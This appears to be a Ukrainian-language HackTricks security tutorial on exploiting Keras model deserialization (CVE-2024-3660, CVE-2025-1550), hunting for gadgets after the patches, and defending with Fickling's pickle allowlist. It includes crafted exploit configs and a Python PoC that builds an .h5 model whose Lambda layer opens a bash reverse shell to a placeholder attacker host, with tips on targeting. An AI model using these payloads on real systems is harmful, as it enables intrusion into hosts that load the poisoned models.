# RCE під час десеріалізації моделей Keras і пошук gadget-ів

{{#include ../../banners/hacktricks-training.md}}

На цій сторінці стисло описано практичні методи експлуатації конвеєра десеріалізації моделей Keras, пояснено внутрішню будову нативного формату .keras і його поверхню атаки, а також наведено інструментарій для дослідників, які шукають уразливості у файлах моделей (MFV) і gadget-и, що залишаються після виправлень.

## Внутрішня будова формату моделей .keras

Файл .keras — це ZIP-архів, який містить щонайменше:<sup>[[1]](#references)</sup>
- metadata.json – загальна інформація (наприклад, версія Keras)
- config.json – архітектура моделі (основна поверхня атаки)
- model.weights.h5 – ваги у форматі HDF5

config.json запускає рекурсивну десеріалізацію: Keras імпортує модулі, знаходить класи та функції й відтворює шари/об’єкти зі словників, контрольованих зловмисником.<sup>[[1]](#references)</sup>

Приклад фрагмента для об’єкта шару Dense:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Десеріалізація виконує:<sup>[[1]](#references)</sup>
- Імпорт модулів і визначення символів за ключами module/class_name
- Виклик from_config(...) або конструктора з kwargs, контрольованими зловмисником
- Рекурсивну обробку вкладених об’єктів (активацій, ініціалізаторів, обмежень тощо)

Історично це надавало зловмиснику, який створював config.json, три примітиви:<sup>[[1]](#references)</sup>
- Контроль над імпортованими модулями
- Контроль над класами/функціями, які визначаються
- Контроль над kwargs, переданими конструкторам/from_config

## CVE-2024-3660 – RCE через bytecode у Lambda-layer

Першопричина:
- Під час десеріалізації Legacy Lambda відновлював Python-функцію з marshaled-коду, контрольованого зловмисником: `func_load()` декодує payload з base64, викликає `marshal.loads()` і створює `FunctionType`. Bytecode отриманої функції виконується під час виклику Lambda, а завантажувачі до версії 2.13 не перевіряли safe-mode для застарілих форматів.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

У нативному архіві Keras v3 функція Lambda представлена об’єктом `__lambda__`, поле `code` якого містить marshaled-код, закодований у base64:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Пом’якшення:
- Keras за замовчуванням застосовує `safe_mode=True` для нативного формату Keras v3. Серіалізовані лямбда-функції Python у `Lambda` блокуються, якщо користувач явно не вимкне цей режим за допомогою `safe_mode=False`; цей захист не поширюється так само на застарілі формати.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Примітки:
- Застарілі формати (старіші файли HDF5) або старіші кодові бази можуть не застосовувати сучасні перевірки, тож атаки типу «downgrade» усе ще можливі, якщо жертви використовують старі завантажувачі.

## CVE-2025-1550 – Імпорт довільних модулів у Keras 3.0.0–3.8.x

Першопричина:
- `_retrieve_class_or_fn` використовував `importlib.import_module(module)` для імпорту модулів із рядків, контрольованих атакувальником, із `config.json`.
- Вплив: Створений спеціальним чином архів `.keras` міг змусити `Model.load_model()` імпортувати вибрані атакувальником модулі та функції Python із побічними ефектами під час імпорту й аргументами, контрольованими атакувальником, навіть за `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Ідея експлуатації:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Покращення безпеки (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist модулів: імпорт обмежено офіційними модулями екосистеми: keras, keras_hub, keras_cv, keras_nlp
- Безпечний режим за замовчуванням: safe_mode=True блокує небезпечне завантаження серіалізованих функцій Lambda
- Базова перевірка типів: десеріалізовані об’єкти мають відповідати очікуваним типам

## Практична експлуатація: TensorFlow-Keras HDF5 (.h5) Lambda RCE

У застарілих розгортаннях TensorFlow-Keras досі можуть прийматися файли моделей HDF5 (`.h5`). Якщо зловмисник може завантажити модель, яку сервер згодом завантажить або використає для інференсу, вразливий завантажувач може десеріалізувати шар Lambda, що містить контрольований зловмисником код Python, який потім може виконатися в робочому процесі моделі застосунку.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Мінімальний PoC для створення шкідливого .h5, у якому Lambda виконує reverse shell, коли ціль викликає модель:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Нотатки та поради щодо надійності:
- Точки запуску залежать від формату й робочого процесу; у згаданому матеріалі payload виконувався двічі під час передбачення. Вважайте, що побічні ефекти можуть повторюватися, і створюйте ідемпотентні payload.<sup>[[7]](#references)</sup>
- Фіксація версій: використовуйте TF/Keras/Python, сумісні з середовищем цілі, щоб уникнути невідповідностей серіалізації. Наприклад, створюйте артефакти з Python 3.8 і TensorFlow 2.13.1, якщо саме їх використовує ціль.<sup>[[7]](#references)</sup>
- Швидке відтворення середовища:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Перевірка: нешкідливе корисне навантаження на кшталт os.system("ping -c 1 YOUR_IP") допомагає підтвердити виконання (наприклад, спостерігайте за ICMP за допомогою tcpdump), перш ніж перейти до reverse shell.<sup>[[7]](#references)</sup>

## Поверхня gadget-ів усередині allowlist після виправлення

Навіть за наявності allowlist модулів Keras і safe mode дозволені викликані об’єкти можуть спричиняти побічні ефекти. Наприклад, `keras.utils.get_file` завантажує URL і записує його у налаштоване місце кешу, тож цей об’єкт може стати кандидатом для аналізу gadget-ів.<sup>[[1]](#references)[[19]](#references)</sup>

Приклад конфігурації Lambda-кандидата (перевірте сигнатуру виклику в контрольованому тесті):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Important limitation:
- `Lambda.call()` завжди передає вхідні дані моделі як перший позиційний аргумент, а налаштовані `arguments` — як іменовані аргументи. Для `get_file` це позиційне значення заповнює `fname`; невідповідність між tensor і шляхом може призвести до збою цього кандидата ще до завантаження, тому це не гарантовано робочий gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlisting імпортів ML pickle для AI/ML моделей (Fickling)

У багатьох форматах AI/ML моделей (PyTorch `.pt`/`.pth`/`.ckpt`, артефактах joblib/scikit-learn та інших нативних для Python форматах) вбудовані дані Python pickle. У застарілому шляху Keras Lambda, описаному вище, натомість використовується байткод функцій у форматі marshal, тож це окремий ризик десеріалізації. Опкоди pickle можуть виконувати контрольовані зловмисником дії під час десеріалізації, зокрема змінювати модель або спричиняти RCE, а прості сканери можуть не виявити нові чи не внесені до списку небезпечні імпорти.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Практичний захист за принципом fail-closed — перехоплювати десеріалізатор pickle у Python і дозволяти під час unpickling лише перевірений набір безпечних імпортів, пов’язаних із ML. Fickling від Trail of Bits реалізує цю політику та містить підготовлений allowlist імпортів ML, сформований на основі тисяч публічних pickle-файлів із Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Модель безпеки для «безпечних» імпортів (узагальнення висновків із досліджень і практики): символи, імпортовані pickle, мають одночасно:<sup>[[8]](#references)</sup>
- Не виконувати код і не спричиняти його виконання (жодних скомпільованих об’єктів коду чи вихідного коду, запуску команд оболонки, хуків тощо)
- Не отримувати й не задавати довільні атрибути або елементи
- Не імпортувати й не отримувати посилання на інші об’єкти Python із VM pickle
- Не запускати жодні вторинні десеріалізатори (наприклад, marshal або вкладений pickle), навіть опосередковано

Увімкніть захист Fickling якомога раніше під час запуску процесу, щоб перевірялися всі операції завантаження pickle, які виконують фреймворки (`torch.load`, `joblib.load` тощо):<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Операційні поради:
- За потреби можна тимчасово вимикати й повторно вмикати hooks:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Якщо перевірену модель заблоковано, розширте allowlist для вашого середовища після перевірки символів:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling також надає загальні runtime-запобіжники, якщо вам потрібен детальніший контроль:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() для перевірок усіх викликів pickle.load()
  - with fickling.check_safety(): для обмежених областю перевірок
  - fickling.load(path) / fickling.is_likely_safe(path) для одноразових перевірок

- За можливості надавайте перевагу форматам моделей без pickle (наприклад, SafeTensors).<sup>[[15]](#references)</sup> Якщо потрібно приймати pickle, запускайте завантажувачі з мінімальними привілеями, без вихідного мережевого трафіку та забезпечте застосування allowlist.

Ця стратегія з пріоритетом allowlist на практиці блокує поширені шляхи експлуатації ML pickle, зберігаючи високу сумісність. У тестуванні ToB Fickling виявив 100% синтетичних шкідливих файлів і дозволив приблизно 99% чистих файлів із провідних репозиторіїв Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) Систематичний пошук gadget у дозволених модулях

Перелічіть потенційні callable-об’єкти в keras, keras_nlp, keras_cv, keras_hub і надайте пріоритет тим, що мають побічні ефекти з файлами, мережею, процесами або env.<sup>[[1]](#references)</sup>

<details>
<summary>Перелік потенційно небезпечних callable-об’єктів у allowlisted модулях Keras</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Тестування прямої десеріалізації (архів .keras не потрібен)

Передавайте підготовлені словники безпосередньо десеріалізаторам Keras, щоб з’ясувати, які параметри приймаються, і спостерігати за побічними ефектами.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Перевірка різних версій і форматів

Keras існує в кількох кодових базах/версіях із різними захисними механізмами та форматами:<sup>[[1]](#references)</sup>
- Вбудований у TensorFlow Keras: tensorflow/python/keras (застарілий, запланований до видалення)
- tf-keras: підтримується окремо
- Multi-backend Keras 3 (official): запроваджено нативний .keras

Повторіть тести в різних кодових базах і форматах (.keras проти застарілого HDF5), щоб виявити регресії або відсутні перевірки.

## References

- [1] [Пошук вразливостей у десеріалізації моделей Keras (блог huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 — додано перевірки до серіалізації](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 — RCE через десеріалізацію Lambda у Keras](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 — довільний імпорт модулів у Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Звіт huntr — довільний імпорт #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Звіт huntr — довільний імпорт #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial — RCE через Lambda у TensorFlow .h5 з отриманням root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Блог Trail of Bits — новий сканер файлів pickle для AI/ML від Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling — захист середовищ AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Корпус тестів для сканування pickle у Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Передумови атак Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Проєкт SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 — Lambda Layers у Keras 2 дають змогу довільно впроваджувати код](https://kb.cert.org/vuls/id/253266)
- [17] [Вихідний код шару Lambda у Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Вихідний код утиліт Python у Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API Keras `get_file`](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
